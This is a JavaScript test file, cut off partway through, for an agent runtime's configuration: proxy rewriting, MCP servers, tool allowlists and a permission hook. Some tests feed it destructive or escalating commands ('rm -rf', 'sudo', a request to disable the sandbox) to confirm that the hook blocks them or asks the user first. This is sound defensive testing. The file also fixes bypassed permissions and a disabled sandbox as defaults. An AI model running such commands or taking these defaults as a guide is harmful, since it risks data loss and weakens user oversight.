import fs from "fs";
import os from "os";
import path from "path";
import { describe, expect, it } from "vitest";
import { buildClaudeRuntimeConfig } from "./claude-runtime-config.js";
import { encodeClaudeProjectDir } from "./claude-transcript.js";

function createConfig(overrides = {}) {
  const { env: envOverride = {}, ...rest } = overrides;
  const mergedEnv = {
    HANAKO_BROWSER_PROVIDER: "embedded",
    HANAKO_CLAUDE_IN_CHROME_INSTALLED: "0",
    HANAKO_OPEN_COMPUTER_USE_DISABLED: "1",
    ...envOverride,
  };
  return buildClaudeRuntimeConfig({
    agent: {
      agentDir: "/tmp/agent",
      buildSystemAppendPrompt: () => "",
      ...overrides.agent,
    },
    cwd: "/tmp",
    workspace: "/tmp",
    env: mergedEnv,
    ...rest,
  });
}

describe("buildClaudeRuntimeConfig env", () => {
  it("inherits process env by default", () => {
    const config = createConfig();
    const inheritedKey = ["PATH", "HOME", "USERPROFILE"].find((key) => typeof process.env[key] === "string");
    expect(inheritedKey).toBeTruthy();
    expect(config.options.env[inheritedKey]).toBe(process.env[inheritedKey]);
  });

  it("allows explicit env overrides", () => {
    const config = createConfig({
      env: {
        PATH: "/custom/path",
        HANAKO_TEST_ENV: "ok",
      },
    });

    expect(config.options.env.PATH).toBe("/custom/path");
    expect(config.options.env.HANAKO_TEST_ENV).toBe("ok");
  });

  it("replaces Claude proxy env with the local system proxy", () => {
    const config = createConfig({
      env: {
        http_proxy: "http://localhost:64180",
        https_proxy: "http://localhost:64180",
        all_proxy: "socks5://localhost:64181",
        no_proxy: "localhost,127.0.0.1",
        HTTP_PROXY: "http://localhost:64180",
        HTTPS_PROXY: "http://localhost:64180",
        ALL_PROXY: "socks5://localhost:64181",
        NO_PROXY: "localhost,127.0.0.1",
      },
    });

    expect(config.options.env.http_proxy).toBe("http://127.0.0.1:7897");
    expect(config.options.env.https_proxy).toBe("http://127.0.0.1:7897");
    expect(config.options.env.all_proxy).toBe("socks5h://127.0.0.1:7897");
    expect(config.options.env.HTTP_PROXY).toBe("http://127.0.0.1:7897");
    expect(config.options.env.HTTPS_PROXY).toBe("http://127.0.0.1:7897");
    expect(config.options.env.ALL_PROXY).toBe("socks5h://127.0.0.1:7897");
    expect(config.options.env.no_proxy).toBe("localhost,127.0.0.1,::1");
    expect(config.options.env.NO_PROXY).toBe("localhost,127.0.0.1,::1");
    expect(config.options.env.BASH_ENV).toBe("/tmp/agent/.hanako-no-proxy/bash_env");
    expect(config.options.env.CURL_HOME).toBe("/tmp/agent/.hanako-no-proxy/curl");
    expect(fs.readFileSync(config.options.env.BASH_ENV, "utf8")).toContain("curl --proxy");
    expect(fs.readFileSync(`${config.options.env.CURL_HOME}/.curlrc`, "utf8")).toContain('proxy = "http://127.0.0.1:7897"');
  });

  it("defaults CLAUDE_CONFIG_DIR to current agent directory", () => {
    const config = createConfig({
      agent: { agentDir: "/tmp/agent-claude-dir" },
    });

    expect(config.options.env.CLAUDE_CONFIG_DIR).toBe("/tmp/agent-claude-dir");
  });

  it("keeps explicit CLAUDE_CONFIG_DIR from runtime env", () => {
    const config = createConfig({
      agent: { agentDir: "/tmp/agent-claude-dir" },
      env: {
        CLAUDE_CONFIG_DIR: "/tmp/custom-claude-dir",
      },
    });

    expect(config.options.env.CLAUDE_CONFIG_DIR).toBe("/tmp/custom-claude-dir");
  });

  it("pins Claude SDK executable to current process executable", () => {
    const config = createConfig();
    expect(config.options.executable).toBe(process.execPath);
  });

  it("supports explicit Claude SDK executable override", () => {
    const config = createConfig({
      env: {
        HANAKO_CLAUDE_CODE_EXECUTABLE: "/tmp/custom-node",
        HANAKO_CLAUDE_CODE_EXECUTABLE_ARGS: "[\"--trace-warnings\"]",
        HANAKO_CLAUDE_CODE_CLI_PATH: "/tmp/custom-cli.js",
      },
    });

    expect(config.options.executable).toBe("/tmp/custom-node");
    expect(config.options.executableArgs).toEqual(["--trace-warnings"]);
    expect(config.options.pathToClaudeCodeExecutable).toBe("/tmp/custom-cli.js");
  });

  it("uses non-partial streaming by default and bypass permission mode", () => {
    const config = createConfig();
    expect(config.options.includePartialMessages).toBe(false);
    expect(config.options.permissionMode).toBe("bypassPermissions");
    expect(config.options.allowDangerouslySkipPermissions).toBe(true);
    expect(config.options.settings).toEqual({
      skipWebFetchPreflight: true,
    });
  });

  it("can enable partial SDK messages for chat sessions", () => {
    const config = createConfig({ includePartialMessages: true });
    expect(config.options.includePartialMessages).toBe(true);
  });

  it("disables sandbox even when legacy sandbox modes/path rules are provided", () => {
    const config = createConfig({
      workspace: "/tmp/workspace",
      toolProfile: {
        sandbox: {
          mode: "standard",
          path_rules: [
            { path: "/tmp/ro", access: "read_only" },
            { path: "/tmp/rw", access: "read_write" },
          ],
        },
      },
    });

    expect(config.options.sandbox).toEqual({ enabled: false });
    expect(config.options.allowDangerouslySkipPermissions).toBe(true);
  });

  it("keeps sandbox disabled on all platforms", () => {
    const config = createConfig({
      toolProfile: {
        sandbox: {
          mode: "standard",
        },
      },
    });
    expect(config.options.sandbox).toEqual({ enabled: false });
  });

  it("defaults settingSources to user and injects options.tools by default", () => {
    const config = createConfig({
      toolProfile: {
        tools: {
          builtin_enabled: ["Read", "Glob", "Grep"],
        },
      },
    });
    expect(config.options.settingSources).toEqual(["user"]);
    expect(config.options.allowedTools).toEqual(["Read", "Glob", "Grep"]);
    expect(config.options.tools).toEqual(["Read", "Glob", "Grep"]);
    expect(config.diagnostics?.forcedToolsOption).toBe(true);
  });

  it("normalizes lowercase skill alias in builtin_enabled", () => {
    const config = createConfig({
      toolProfile: {
        tools: {
          builtin_enabled: ["skill", "read"],
        },
      },
    });
    expect(config.options.allowedTools).toEqual(["Skill", "Read"]);
    expect(config.options.tools).toEqual(["Skill", "Read"]);
  });

  it("filters disabled builtin tools from allowed tool lists", () => {
    const config = createConfig({
      toolProfile: {
        tools: {
          builtin_enabled: ["Read", "AskUserQuestion", "EnterPlanMode", "ExitPlanMode"],
        },
      },
      disabledBuiltinTools: ["AskUserQuestion", "EnterPlanMode", "ExitPlanMode"],
    });

    expect(config.options.allowedTools).toEqual(["Read"]);
    expect(config.options.tools).toEqual(["Read"]);
    expect(config.diagnostics?.builtinEnabled).toEqual(["Read"]);
  });

  it("forces a filtered builtin allowlist when only disabled builtin tools are provided", () => {
    const config = createConfig({
      disabledBuiltinTools: ["AskUserQuestion", "EnterPlanMode", "ExitPlanMode"],
    });

    expect(config.options.allowedTools).toContain("Read");
    expect(config.options.allowedTools).toContain("Bash");
    expect(config.options.allowedTools).not.toContain("AskUserQuestion");
    expect(config.options.allowedTools).not.toContain("EnterPlanMode");
    expect(config.options.allowedTools).not.toContain("ExitPlanMode");
    expect(config.options.tools).toEqual(config.options.allowedTools);
  });

  it("supports settingSources override via env", () => {
    const config = createConfig({
      env: {
        HANAKO_CLAUDE_SETTING_SOURCES: "project,local,invalid",
      },
    });
    expect(config.options.settingSources).toEqual(["project", "local"]);
  });

  it("prefers agent setting_sources over env override", () => {
    const config = createConfig({
      agent: {
        config: {
          claude: {
            setting_sources: ["user", "project"],
          },
        },
      },
      env: {
        HANAKO_CLAUDE_SETTING_SOURCES: "local",
      },
    });
    expect(config.options.settingSources).toEqual(["user", "project"]);
  });

  it("can disable options.tools via env for compatibility debugging", () => {
    const original = process.env.HANAKO_FORCE_SDK_TOOLS_OPTION;
    process.env.HANAKO_FORCE_SDK_TOOLS_OPTION = "0";
    try {
      const config = createConfig({
        toolProfile: {
          tools: {
            builtin_enabled: ["Read", "Glob"],
          },
        },
      });
      expect("tools" in config.options).toBe(false);
      expect(config.options.allowedTools).toEqual(["Read", "Glob"]);
      expect(config.diagnostics?.forcedToolsOption).toBe(false);
    } finally {
      if (original === undefined) delete process.env.HANAKO_FORCE_SDK_TOOLS_OPTION;
      else process.env.HANAKO_FORCE_SDK_TOOLS_OPTION = original;
    }
  });

  it("includes enabled custom MCP tools in allowedTools", () => {
    const config = createConfig({
      toolProfile: {
        tools: {
          builtin_enabled: ["Read", "Glob"],
          custom_enabled: ["cron", "notify"],
        },
      },
      customTools: [
        { name: "cron", parameters: { type: "object", properties: {} } },
        { name: "notify", parameters: { type: "object", properties: {} } },
      ],
    });

    expect(config.options.allowedTools).toEqual([
      "Read",
      "Glob",
      "mcp__hanako__*",
    ]);
    expect(config.diagnostics?.customToolsLoaded).toEqual(["cron", "notify"]);
    expect(config.diagnostics?.allowedTools).toEqual([
      "Read",
      "Glob",
      "mcp__hanako__*",
    ]);
  });

  it("attaches MiniMax MCP server and allows only enabled MiniMax MCP tools", async () => {
    const config = createConfig({
      toolProfile: {
        tools: {
          builtin_enabled: ["Read"],
          custom_enabled: ["minimax_mcp_web_search", "notify"],
        },
      },
      customTools: [
        { name: "minimax_mcp_web_search", parameters: { type: "object", properties: {} } },
        { name: "minimax_mcp_understand_image", parameters: { type: "object", properties: {} } },
        { name: "notify", parameters: { type: "object", properties: {} } },
      ],
    });

    expect(config.options.mcpServers.MiniMax).toEqual({
      type: "stdio",
      command: "uvx",
      args: ["minimax-coding-plan-mcp"],
    });
    expect(config.options.allowedTools).toContain("mcp__MiniMax__web_search");
    expect(config.options.allowedTools).not.toContain("mcp__MiniMax__understand_image");
    expect(config.diagnostics?.customToolsLoaded).toEqual(["notify"]);
    expect(config.diagnostics?.enabledMiniMaxMcpTools).toEqual(["web_search"]);
    expect(config.diagnostics?.useMiniMaxMcp).toBe(true);

    const allowed = await config.options.canUseTool("mcp__MiniMax__web_search", { query: "latest" }, {
      signal: new AbortController().signal,
      toolUseID: "tool-minimax-web-search",
    });
    expect(allowed).toMatchObject({
      behavior: "allow",
      updatedInput: { query: "latest" },
    });

    const denied = await config.options.canUseTool("mcp__MiniMax__understand_image", { url: "https://example.com/a.png" }, {
      signal: new AbortController().signal,
      toolUseID: "tool-minimax-understand-image",
    });
    expect(denied).toMatchObject({
      behavior: "deny",
    });
  });

  it("does not attach MiniMax MCP server in noTools mode", () => {
    const config = createConfig({
      noTools: true,
      toolProfile: {
        tools: {
          custom_enabled: ["minimax_mcp_web_search", "minimax_mcp_understand_image"],
        },
      },
    });

    expect(config.options.mcpServers.MiniMax).toBeUndefined();
    expect(config.options.allowedTools).toEqual([]);
    expect(config.diagnostics?.useMiniMaxMcp).toBe(false);
  });

  it("attaches configured external MCP servers and allows their tool namespace", async () => {
    const config = createConfig({
      agent: {
        config: {
          mcp: {
            external_servers: {
              context7: {
                type: "stdio",
                command: "npx",
                args: ["-y", "@upstash/context7-mcp"],
                env: { CONTEXT7_API_KEY: "test" },
              },
            },
          },
        },
      },
      toolProfile: {
        tools: {
          builtin_enabled: ["Read"],
        },
      },
    });

    expect(config.options.mcpServers.context7).toEqual({
      type: "stdio",
      command: "npx",
      args: ["-y", "@upstash/context7-mcp"],
      env: { CONTEXT7_API_KEY: "test" },
    });
    expect(config.options.allowedTools).toEqual(["Read", "mcp__context7__*"]);
    expect(config.diagnostics?.externalMcpServers).toEqual(["context7"]);

    const allowed = await config.options.canUseTool("mcp__context7__resolve-library-id", {
      libraryName: "react",
    }, {
      signal: new AbortController().signal,
      toolUseID: "tool-context7",
    });
    expect(allowed).toMatchObject({
      behavior: "allow",
      updatedInput: { libraryName: "react" },
    });
  });

  it("attaches global external MCP servers and respects per-agent disabled list", () => {
    const config = createConfig({
      agent: {
        _engine: {
          getExternalMcpServers: () => ({
            context7: {
              type: "stdio",
              command: "npx",
              args: ["-y", "@upstash/context7-mcp"],
            },
            playwright: {
              type: "stdio",
              command: "npx",
              args: ["@playwright/mcp"],
            },
          }),
        },
        config: {
          mcp: {
            disabled_servers: ["context7"],
          },
        },
      },
      toolProfile: {
        tools: {
          builtin_enabled: ["Read"],
        },
      },
    });

    expect(config.options.mcpServers.context7).toBeUndefined();
    expect(config.options.mcpServers.playwright).toEqual({
      type: "stdio",
      command: "npx",
      args: ["@playwright/mcp"],
    });
    expect(config.options.allowedTools).toEqual(["Read", "mcp__playwright__*"]);
    expect(config.diagnostics?.externalMcpServers).toEqual(["playwright"]);
  });

  it("allows a user-configured MiniMax external MCP server", () => {
    const config = createConfig({
      agent: {
        config: {
          mcp: {
            external_servers: {
              MiniMax: {
                type: "stdio",
                command: "uvx",
                args: ["minimax-coding-plan-mcp", "-y"],
                env: {
                  MINIMAX_API_KEY: "test",
                  MINIMAX_API_HOST: "https://api.minimaxi.com",
                },
              },
            },
          },
        },
      },
      toolProfile: {
        tools: {
          builtin_enabled: ["Read"],
          custom_enabled: [],
        },
      },
    });

    expect(config.options.mcpServers.MiniMax).toEqual({
      type: "stdio",
      command: "uvx",
      args: ["minimax-coding-plan-mcp", "-y"],
      env: {
        MINIMAX_API_KEY: "test",
        MINIMAX_API_HOST: "https://api.minimaxi.com",
      },
    });
    expect(config.options.allowedTools).toContain("mcp__MiniMax__*");
    expect(config.diagnostics?.externalMcpServers).toEqual(["MiniMax"]);
  });

  it("skips external MCP servers in noTools mode", () => {
    const config = createConfig({
      noTools: true,
      agent: {
        config: {
          mcp: {
            external_servers: {
              context7: { command: "npx", args: ["-y", "@upstash/context7-mcp"] },
            },
          },
        },
      },
    });

    expect(config.options.mcpServers.context7).toBeUndefined();
    expect(config.options.allowedTools).toEqual([]);
    expect(config.diagnostics?.externalMcpServers).toEqual([]);
  });

  it("attaches built-in open_computer_use MCP server by default", () => {
    const config = createConfig({
      env: {
        HANAKO_OPEN_COMPUTER_USE_DISABLED: "0",
      },
      toolProfile: {
        tools: {
          builtin_enabled: ["Read"],
        },
      },
    });

    const server = config.options.mcpServers.open_computer_use;
    expect(server?.type).toBe("stdio");
    expect(server?.command).toBe(process.execPath);
    expect(Array.isArray(server?.args)).toBe(true);
    expect(server?.args?.[1]).toBe("mcp");
    expect(String(server?.args?.[0] || "")).toContain(
      path.join("open-computer-use", "bin", "open-computer-use"),
    );
    expect(config.options.allowedTools).toContain("mcp__open_computer_use__*");
    expect(config.diagnostics?.externalMcpServers).toContain("open_computer_use");
  });

  it("can disable built-in open_computer_use MCP server via env switch", () => {
    const config = createConfig({
      env: {
        HANAKO_OPEN_COMPUTER_USE_DISABLED: "1",
      },
      toolProfile: {
        tools: {
          builtin_enabled: ["Read"],
        },
      },
    });

    expect(config.options.mcpServers.open_computer_use).toBeUndefined();
    expect(config.options.allowedTools).toEqual(["Read"]);
    expect(config.diagnostics?.externalMcpServers).toEqual([]);
  });

  it("supports explicit open_computer_use command override", () => {
    const config = createConfig({
      env: {
        HANAKO_OPEN_COMPUTER_USE_DISABLED: "0",
        HANAKO_OPEN_COMPUTER_USE_COMMAND: "open-computer-use",
      },
      toolProfile: {
        tools: {
          builtin_enabled: ["Read"],
        },
      },
    });

    expect(config.options.mcpServers.open_computer_use).toEqual({
      type: "stdio",
      command: "open-computer-use",
      args: ["mcp"],
    });
  });

  it("keeps tool settings and Skill availability visible in noMemory tool sessions", () => {
    const calls = [];
    const config = createConfig({
      noMemory: true,
      agent: {
        personality: "personality only",
        buildSystemAppendPrompt: (opts) => {
          calls.push(opts);
          return [
            "tool-aware no-memory append",
            "Standard Claude tools available in this session (only these): Skill / Read",
            "Hanako/MCP tools available in this session (only these): notify",
          ].join("\n");
        },
      },
      toolProfile: {
        tools: {
          builtin_enabled: ["Skill", "Read"],
          custom_enabled: ["notify"],
        },
      },
      customTools: [
        { name: "notify", parameters: { type: "object", properties: {} } },
      ],
    });

    expect(calls).toEqual([{
      includeUserProfile: false,
      includeMemory: false,
      includeDateTime: false,
    }]);
    expect(config.options.systemPrompt.append).toContain("tool-aware no-memory append");
    expect(config.options.systemPrompt.append).toContain("Skill / Read");
    expect(config.options.allowedTools).toEqual(["Skill", "Read", "mcp__hanako__*"]);
    expect(config.diagnostics?.customToolsLoaded).toEqual(["notify"]);
  });

  it("uses personality-only prompt for noMemory sessions when tools are disabled", () => {
    let called = false;
    const config = createConfig({
      noMemory: true,
      noTools: true,
      agent: {
        personality: "personality only",
        buildSystemAppendPrompt: () => {
          called = true;
          return "should not appear";
        },
      },
      toolProfile: {
        tools: {
          builtin_enabled: ["Skill", "Read"],
          custom_enabled: ["notify"],
        },
      },
      customTools: [
        { name: "notify", parameters: { type: "object", properties: {} } },
      ],
    });

    expect(called).toBe(false);
    expect(config.options.systemPrompt.append).toBe("personality only");
    expect(config.options.allowedTools).toEqual([]);
  });

  it("allows a user-configured claude_in_chrome external MCP server", () => {
    const config = createConfig({
      agent: {
        config: {
          mcp: {
            external_servers: {
              claude_in_chrome: {
                type: "stdio",
                command: "node",
                args: ["/tmp/custom-browser-mcp.js", "--claude-in-chrome-mcp"],
              },
            },
          },
        },
      },
      toolProfile: {
        tools: {
          builtin_enabled: ["Read"],
          custom_enabled: [],
        },
      },
    });

    expect(config.options.mcpServers.claude_in_chrome).toEqual({
      type: "stdio",
      command: "node",
      args: ["/tmp/custom-browser-mcp.js", "--claude-in-chrome-mcp"],
    });
    expect(config.options.allowedTools).toContain("mcp__claude_in_chrome__*");
    expect(config.options.allowedTools).toContain("Read");
    expect(config.diagnostics?.externalMcpServers).toContain("claude_in_chrome");
  });

  it("does not auto-attach claude_in_chrome MCP without external config", () => {
    const config = createConfig({
      env: {
        HANAKO_BROWSER_PROVIDER: "auto",
        HANAKO_CLAUDE_IN_CHROME_INSTALLED: "1",
      },
    });

    expect(config.options.mcpServers.claude_in_chrome).toBeUndefined();
    expect(config.options.allowedTools || []).not.toContain("mcp__claude_in_chrome__*");
  });

  it("installs canUseTool handler by default to avoid permission prompt deadlocks", async () => {
    const original = process.env.HANAKO_CLAUDE_PERMISSION_STRATEGY;
    delete process.env.HANAKO_CLAUDE_PERMISSION_STRATEGY;
    try {
      const config = createConfig();
      expect(typeof config.options.canUseTool).toBe("function");
      const decision = await config.options.canUseTool("mcp__MiniMax__web_search", { query: "latest" }, {
        signal: new AbortController().signal,
        toolUseID: "tool-1",
      });
      expect(decision).toMatchObject({
        behavior: "allow",
        updatedInput: { query: "latest" },
      });
      expect(config.diagnostics?.permissionStrategy).toBe("auto_allow");
      expect(config.diagnostics?.hasCanUseTool).toBe(true);
      expect(config.diagnostics?.hasPreToolUseHooks).toBe(true);
      expect(Array.isArray(config.options.hooks?.PreToolUse)).toBe(true);
    } finally {
      if (original === undefined) delete process.env.HANAKO_CLAUDE_PERMISSION_STRATEGY;
      else process.env.HANAKO_CLAUDE_PERMISSION_STRATEGY = original;
    }
  });

  it("applies high-risk denial through PreToolUse hook path", async () => {
    const root = fs.mkdtempSync(path.join(os.tmpdir(), "hanako-risk-hook-"));
    try {
      const sessionPath = path.join(root, "sessions", "bridge", "owner", "hook.session.json");
      fs.mkdirSync(path.dirname(sessionPath), { recursive: true });
      fs.writeFileSync(
        sessionPath,
        JSON.stringify({ kind: "claude-agent-session", sessionId: "hook", cwd: root }) + "\n",
        "utf-8",
      );

      const config = createConfig({
        workspace: root,
        sessionPath,
      });
      const callback = config.options.hooks?.PreToolUse?.[0]?.hooks?.[0];
      expect(typeof callback).toBe("function");

      const denied = await callback({
        hook_event_name: "PreToolUse",
        tool_name: "Bash",
        tool_input: {
          command: [
            'rm "/Users/tc/Desktop/截屏2026-05-10 05.04.53.png"',
            '"/Users/tc/Desktop/截屏2026-05-10 05.04.57.png"',
          ].join(" "),
        },
        tool_use_id: "tool-risk-hook-1",
      }, "tool-risk-hook-1", {
        signal: new AbortController().signal,
      });

      expect(denied).toMatchObject({
        continue: true,
        decision: "block",
        reason: expect.stringContaining("高风险操作"),
        hookSpecificOutput: {
          hookEventName: "PreToolUse",
          permissionDecision: "deny",
        },
      });
      expect(String(denied.hookSpecificOutput?.permissionDecisionReason || "")).toContain("高风险操作");
    } finally {
      fs.rmSync(root, { recursive: true, force: true });
    }
  });

  it("denies tools that are outside the configured allowlist", async () => {
    const config = createConfig({
      toolProfile: {
        tools: {
          builtin_enabled: ["Read"],
        },
      },
    });
    const decision = await config.options.canUseTool("CronCreate", {}, {
      signal: new AbortController().signal,
      toolUseID: "tool-croncreate",
    });
    expect(decision).toMatchObject({
      behavior: "deny",
    });
    expect(String(decision.message || "")).toContain("not allowed");
  });

  it("enforces MCP wildcard allowlist for custom tool namespace", async () => {
    const config = createConfig({
      toolProfile: {
        tools: {
          custom_enabled: ["cron"],
        },
      },
      customTools: [
        { name: "cron", parameters: { type: "object", properties: {} } },
      ],
    });

    const allowed = await config.options.canUseTool("mcp__hanako__cron", { action: "list" }, {
      signal: new AbortController().signal,
      toolUseID: "tool-allowed",
    });
    expect(allowed).toMatchObject({
      behavior: "allow",
      updatedInput: { action: "list" },
    });

    const denied = await config.options.canUseTool("mcp__MiniMax__web_search", { query: "latest" }, {
      signal: new AbortController().signal,
      toolUseID: "tool-denied",
    });
    expect(denied).toMatchObject({
      behavior: "deny",
    });
  });

  it("requests confirmation for EnterPlanMode/ExitPlanMode when confirmStore is available", async () => {
    const emitted = [];
    let createCount = 0;
    const confirmStore = {
      create: () => {
        createCount += 1;
        if (createCount === 1) {
          return { confirmId: "plan-enter-1", promise: Promise.resolve({ action: "confirmed" }) };
        }
        return { confirmId: "plan-exit-1", promise: Promise.resolve({ action: "rejected" }) };
      },
    };
    const config = createConfig({
      sessionPath: "/tmp/session-plan.jsonl",
      confirmStore,
      emitToolEvent: (event) => emitted.push(event),
    });

    const enter = await config.options.canUseTool("EnterPlanMode", {
      prompt: "Draft a plan first",
    }, {
      signal: new AbortController().signal,
      toolUseID: "tool-plan-enter",
    });
    expect(enter).toMatchObject({
      behavior: "allow",
    });

    const exit = await config.options.canUseTool("ExitPlanMode", {
      allowedPrompts: [{ tool: "Bash", prompt: "npm test" }],
    }, {
      signal: new AbortController().signal,
      toolUseID: "tool-plan-exit",
    });
    expect(exit).toMatchObject({
      behavior: "deny",
    });

    expect(emitted).toEqual([
      expect.objectContaining({
        type: "plan_mode_confirmation",
        confirmId: "plan-enter-1",
        phase: "enter",
      }),
      expect.objectContaining({
        type: "plan_mode_confirmation",
        confirmId: "plan-exit-1",
        phase: "exit",
        allowedPrompts: [{ tool: "Bash", prompt: "npm test" }],
      }),
    ]);
  });

  it("requests AskUserQuestion answers and injects them into updatedInput", async () => {
    const emitted = [];
    const confirmStore = {
      create: () => ({
        confirmId: "ask-user-1",
        promise: Promise.resolve({
          action: "confirmed",
          value: { goal: "ship it", risk: "low" },
        }),
      }),
    };
    const config = createConfig({
      sessionPath: "/tmp/session-ask.jsonl",
      confirmStore,
      emitToolEvent: (event) => emitted.push(event),
    });
    const decision = await config.options.canUseTool("AskUserQuestion", {
      questions: [
        { id: "goal", question: "What is your goal?" },
        { id: "risk", question: "Risk tolerance?", options: [{ label: "low" }, { label: "high" }] },
      ],
    }, {
      signal: new AbortController().signal,
      toolUseID: "tool-ask-user",
    });

    expect(decision).toMatchObject({
      behavior: "allow",
      updatedInput: {
        answers: { goal: "ship it", risk: "low" },
      },
    });
    expect(emitted).toEqual([
      expect.objectContaining({
        type: "ask_user_confirmation",
        confirmId: "ask-user-1",
      }),
    ]);
  });

  it("denies Bash calls that explicitly try to disable sandbox", async () => {
    const config = createConfig();
    const decision = await config.options.canUseTool("Bash", {
      command: "ls",
      dangerouslyDisableSandbox: true,
    }, {
      signal: new AbortController().signal,
      toolUseID: "tool-bash-1",
    });
    expect(decision).toMatchObject({
      behavior: "deny",
    });
    expect(decision.message).toContain("disabling sandbox");
  });

  it("denies Bash privilege escalation commands while allowing normal Bash commands", async () => {
    const config = createConfig();
    const denied = await config.options.canUseTool("Bash", {
      command: "sudo ls /",
    }, {
      signal: new AbortController().signal,
      toolUseID: "tool-bash-2",
    });
    expect(denied).toMatchObject({
      behavior: "deny",
    });

    const allowed = await config.options.canUseTool("Bash", {
      command: "npm test",
    }, {
      signal: new AbortController().signal,
      toolUseID: "tool-bash-3",
    });
    expect(allowed).toMatchObject({
      behavior: "allow",
    });
    expect(allowed.updatedInput.command).toContain("unset http_proxy https_proxy all_proxy HTTP_PROXY HTTPS_PROXY ALL_PROXY");
    expect(allowed.updatedInput.command).toContain('export http_proxy="http://127.0.0.1:7897"');
    expect(allowed.updatedInput.command).toContain("npm test");
  });

  it("strips proxy variables from allowed Bash commands", async () => {
    const config = createConfig();
    const decision = await config.options.canUseTool("Bash", {
      command: "curl -v https://mkapi2.dfcfs.com/finskillshub/api/claw/query",
      description: "probe",
    }, {
      signal: new AbortController().signal,
      toolUseID: "tool-bash-proxy",
    });

    expect(decision).toMatchObject({
      behavior: "allow",
      updatedInput: {
        description: "probe",
      },
    });
    expect(decision.updatedInput.command).toBe([
      'unset http_proxy https_proxy all_proxy HTTP_PROXY HTTPS_PROXY ALL_PROXY; export http_proxy="http://127.0.0.1:7897" https_proxy="http://127.0.0.1:7897" HTTP_PROXY="http://127.0.0.1:7897" HTTPS_PROXY="http://127.0.0.1:7897";',
      "curl -v https://mkapi2.dfcfs.com/finskillshub/api/claw/query",
    ].join("\n"));
  });

  it("allows Bash path access outside legacy workspace/path_rules when sandbox is disabled", async () => {
    const config = createConfig({
      workspace: "/tmp/workspace",
      toolProfile: {
        sandbox: {
          mode: "standard",
          path_rules: [{ path: "/tmp/extra", access: "read_only" }],
        },
      },
    });

    const outside = await config.options.canUseTool("Bash", {
      command: "ls -la /tmp/outside",
    }, {
      signal: new AbortController().signal,
      toolUseID: "tool-bash-4",
    });
    expect(outside).toMatchObject({ behavior: "allow" });

    const allowedWorkspace = await config.options.canUseTool("Bash", {
      command: "ls -la /tmp/workspace",
    }, {
      signal: new AbortController().signal,
      toolUseID: "tool-bash-5",
    });
    expect(allowedWorkspace).toMatchObject({ behavior: "allow" });

    const allowedWhitelist = await config.options.canUseTool("Bash", {
      command: "cat /tmp/extra/readme.txt",
    }, {
      signal: new AbortController().signal,
      toolUseID: "tool-bash-6",
    });
    expect(allowedWhitelist).toMatchObject({ behavior: "allow" });
  });

  it("allows Write/Edit paths outside legacy workspace/path_rules when sandbox is disabled", async () => {
    const confirmStore = {
      create: () => ({
        confirmId: "risk-write-1",
        promise: Promise.resolve({ action: "confirmed" }),
      }),
    };
    const config = createConfig({
      workspace: "/tmp/workspace",
      confirmStore,
      toolProfile: {
        sandbox: {
          mode: "standard",
          path_rules: [{ path: "/tmp/extra", access: "read_write" }],
        },
      },
    });

    const outside = await config.options.canUseTool("Write", {
      file_path: "/tmp/outside/file.txt",
      content: "x",
    }, {
      signal: new AbortController().signal,
      toolUseID: "tool-write-outside",
    });
    expect(outside).toMatchObject({ behavior: "allow" });

    const allowedWorkspace = await config.options.canUseTool("Write", {
      file_path: "/tmp/workspace/file.txt",
      content: "x",
    }, {
      signal: new AbortController().signal,
      toolUseID: "tool-write-workspace",
    });
    expect(allowedWorkspace).toMatchObject({ behavior: "allow" });

    const allowedPathRule = await config.options.canUseTool("Edit", {
      file_path: "/tmp/extra/file.txt",
      old_string: "a",
      new_string: "b",
    }, {
      signal: new AbortController().signal,
      toolUseID: "tool-edit-allow-rule",
    });
    expect(allowedPathRule).toMatchObject({ behavior: "allow" });
  });

  it("requests ask-user confirmation for high-risk tool calls in chat mode", async () => {
    const emitted = [];
    const confirmStore = {
      create: () => ({
        confirmId: "risk-chat-1",
        promise: Promise.resolve({ action: "confirmed" }),
      }),
    };
    const config = createConfig({
      sessionPath: "/tmp/chat-risk.session.json",
      confirmStore,
      emitToolEvent: (event) => emitted.push(event),
    });

    const decision = await config.options.canUseTool("Bash", {
      command: "rm -rf /tmp/risk-dir",
    }, {
      signal: new AbortController().signal,
      toolUseID: "tool-risk-chat-1",
    });

    expect(decision).toMatchObject({ behavior: "allow" });
    expect(emitted).toEqual([
      expect.objectContaining({
        type: "ask_user_confirmation",
        confirmId: "risk-chat-1",
      }),
    ]);
    const questions = emitted[0]?.questions || [];
    expect(Array.isArray(questions)).toBe(true);
    expect(String(questions[0]?.question || "")).toContain("是否同意执行以下操作");
    expect(String(questions[0]?.question || "")).not.toContain("rm -rf");
  });

  it("denies high-risk tool call when user selects reject option and submits", async () => {
    const emitted = [];
    const confirmStore = {
      create: () => ({
        confirmId: "risk-chat-reject-option-1",
        promise: Promise.resolve({
          action: "confirmed",
          value: { high_risk_approval: "拒绝执行" },
        }),
      }),
    };
    const config = createConfig({
      sessionPath: "/tmp/chat-risk-reject-option.session.json",
      confirmStore,
      emitToolEvent: (event) => emitted.push(event),
    });

    const decision = await config.options.canUseTool("Bash", {
      command: "rm -rf /tmp/risk-dir",
      description: "确定删除两张截屏吗？",
    }, {
      signal: new AbortController().signal,
      toolUseID: "tool-risk-chat-reject-option-1",
    });

    expect(decision).toMatchObject({ behavior: "deny" });
    expect(String(decision.message || "")).toContain("拒绝");
    expect(emitted).toEqual([
      expect.objectContaining({
        type: "ask_user_confirmation",
        confirmId: "risk-chat-reject-option-1",
      }),
    ]);
  });

  it("uses safe agent-provided confirmation copy for high-risk prompt", async () => {
    const emitted = [];
    const confirmStore = {
      create: () => ({
        confirmId: "risk-chat-agent-copy-1",
        promise: Promise.resolve({ action: "confirmed" }),
      }),
    };
    const config = createConfig({
      sessionPath: "/tmp/chat-risk-agent-copy.session.json",
      confirmStore,
      emitToolEvent: (event) => emitted.push(event),
    });

    const decision = await config.options.canUseTool("Bash", {
      command: "rm -rf /tmp/risk-dir",
      description: "确定删除两张截屏吗？",
    }, {
      signal: new AbortController().signal,
      toolUseID: "tool-risk-chat-agent-copy-1",
    });

    expect(decision).toMatchObject({ behavior: "allow" });
    const questions = emitted[0]?.questions || [];
    expect(String(questions[0]?.question || "")).toContain("删除两张截屏");
  });

  it("falls back to system copy when agent-provided text contains command details", async () => {
    const emitted = [];
    const confirmStore = {
      create: () => ({
        confirmId: "risk-chat-agent-copy-unsafe-1",
        promise: Promise.resolve({ action: "confirmed" }),
      }),
    };
    const config = createConfig({
      sessionPath: "/tmp/chat-risk-agent-copy-unsafe.session.json",
      confirmStore,
      emitToolEvent: (event) => emitted.push(event),
    });

